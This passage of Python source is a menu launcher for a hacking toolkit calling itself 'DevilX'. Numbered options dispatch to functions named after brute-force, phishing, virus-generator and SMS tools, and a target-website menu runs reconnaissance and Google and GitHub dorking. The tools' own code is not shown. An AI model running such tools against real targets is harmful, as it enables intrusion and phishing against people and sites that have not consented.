            elif tolis == '90' :
                os.system('clear')
                print(banner)
                print()
                print()
                termuxkey()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '91' :
                os.system('clear')
                print(banner)
                print()
                print()
                termuxsnippets()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '92' :
                os.system('clear')
                print(banner)
                print()
                print()
                hydra()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '93' :
                os.system('clear')
                print(banner)
                print()
                print()
                toolss()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '94' :
                os.system('clear')
                print(banner)
                print()
                print()
                toolx()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '95' :
                os.system('clear')
                print(banner)
                print()
                print()
                TORhunter()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '96' :
                os.system('clear')
                print(banner)
                print()
                print()
                tracex()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '97' :
                os.system('clear')
                print(banner)
                print()
                print()
                trcexgui()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '98' :
                os.system('clear')
                print(banner)
                print()
                print()
                traperx()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '99' :
                os.system('clear')
                print(banner)
                print()
                print()
                tstyle()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '100' :
                os.system('clear')
                print(banner)
                print()
                print()
                tunnel()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '101' :
                os.system('clear')
                print(banner)
                print()
                print()
                userfinder()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '102' :
                os.system('clear')
                print(banner)
                print()
                print()
                Venomsploit()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '103' :
                os.system('clear')
                print(banner)
                print()
                print()
                Viridae()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '104' :
                os.system('clear')
                print(banner)
                print()
                print()
                WannaTool()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '105' :
                os.system('clear')
                print(banner)
                print()
                print()
                websploit()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '106' :
                os.system('clear')
                print(banner)
                print()
                print()
                WhSms()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '107' :
                os.system('clear')
                print(banner)
                print()
                print()
                Xteam()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '108' :
                os.system('clear')
                print(banner)
                print()
                print()
                ytpro()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '109' :
                os.system('clear')
                print(banner)
                print()
                print()
                zphish()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '110' :
                os.system('clear')
                print(banner)
                print()
                print()
                zvirusg()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == 'B' or tolis == 'b':
                break

            elif tolis == "Q" or tolis == "q":
                exit()

            else:
                pass


    elif mainx == '7' or mainx == '07':
        sitex = input("\n\033[1;91m[*]\033[1;97m Enter Target Website: \033[1;92m")
        while True:
            os.system('clear')
            print(banner)
            lisx = input(liscan)

            if lisx == '1' or lisx == '01':
                print("\033[1;91m[*] \033[1;97mLaunching subdomain Enumaration")
                sleep(1)
                dnsenum()

            elif lisx == '2' or lisx == '02':
                print("\033[1;91m[*] \033[1;97m Launching Port, DNS, Whois")
                sleep(1)
                portis()

            elif lisx == '3' or lisx == '03':
                print("\033[1;91m[*] \033[1;97m Launching Header Built With")
                sleep(1)
                header()

            elif lisx == '4' or lisx == '04':
                print("\033[1;91m[*] \033[1;97m Launching TLS/SSL Certificates")
                sleep(1)
                tlss()

            elif lisx == '5' or lisx == '05':
                print("\033[1;91m[*] \033[1;97m Launching Analyze")
                sleep(1)
                analyze()

            elif lisx == '6' or lisx == '06':
                print("\033[1;91m[*] \033[1;97m Launching Wayback Machine")
                sleep(1)
                wayback()

            elif lisx == '7' or lisx == '07':
                print("\033[1;91m[*] \033[1;97m Launching Search Engine")
                sleep(1)
                srchengne()

            elif lisx == '8' or lisx == '08':
                print("\033[1;91m[*] \033[1;97m Launching Google Dorks")
                sleep(1)
                godork()

            elif lisx == '9' or lisx == '09':
                print("\033[1;91m[*] \033[1;97m Launching Github Dorks P1")
                sleep(1)
                gidork1()

            elif lisx == '10':
                print("\033[1;91m[*] \033[1;97m Launching Github Dorks P2")
                sleep(1)
                gidork2()

            elif lisx == '95':
                break

            elif lisx == '99':
                exit()

            else:
                pass

    elif mainx == "8" or mainx == "08":
        print()
        while True:
            os.system("clear")
            print(banner)
            print()
            print(f"\033[1;91m[*] \033[1;97mThanks for using my tool '\033[1;91mDevilX\033[1;97m'. So you can follow me on various social media site. Link and options are given down below, So select here options where you want to follow me ")
            print()
            fol = input(soc)
            if fol == '1' or fol == '01':
                print()
                print(f"\033[1;91m[*] \033[1;97mOpening my Instagram profile in your device \n")
                sleep(0.8)
                os.system("xdg-open https://instagram.com/haxorlex")
            
            elif fol == '2' or fol == '02':
                print()
                print(f"\033[1;91m[*] \033[1;97mOpening my Facebook page in your device \n")
                sleep(0.8)
                os.system("xdg-open https://facebook.com/hackerxmr")

            elif fol == '3' or fol == '03':
                print()
                print(f"\033[1;91m[*] \033[1;97mOpening my Github profile in your device \n")
                sleep(0.8)
                os.system("xdg-open https://github.com/VritraSecz")

            elif fol == '4' or fol == '04':
                print()
                print(f"\033[1;91m[*] \033[1;97mOpening my YouTube channel in your device \n")
                sleep(0.8)
                os.system("xdg-open https://youtube.com/@Technolex")
            
            elif fol == '5' or fol == '05':
                print()
                print(f"\033[1;91m[*] \033[1;97mOpening my Telegram Channel in your device \n")
                sleep(0.8)
                os.system("xdg-open https://t.me/VritraSecz")

            elif fol == '95':
                break

            elif fol == '99':
                exit()

            elif fol == '':
                pass

            else:
                pass

    elif mainx == "9" or mainx == "09":
        os.system("clear")
        print(banner)
        print()
        print(about)
        print()
        input("\033[1;94mPress ENTER To Continue")

    elif mainx == "99":
        exit()

    else:
        pass
